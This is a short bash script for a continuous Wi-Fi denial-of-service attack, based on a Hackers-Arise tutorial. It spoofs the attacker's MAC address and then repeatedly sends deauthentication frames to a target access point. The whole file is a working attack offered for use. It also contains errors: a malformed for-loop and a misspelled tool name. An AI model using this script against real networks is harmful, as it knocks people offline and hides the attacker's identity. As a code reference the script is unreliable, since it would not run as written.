#! /bin/bash

# This is continous Dos a wireless AP
# Based on this article from Hackers-Arise
# https://www.hackers-arise.com/post/bash-scripting-for-hackers-part-2-building-a-continuous-wi-fi-denial-of-service-tool
# Some APs will not allow this, and you will have to rewrite this script with the individual MAC addresses you want to de-authenticate.

for i {1..10}

do

	sudo macchanger -r wlan0

	airplay-ng --deauth 100 -a InsertMacaddressOfTargetAPHere wlan0mon
	
	sleep 60
	
done
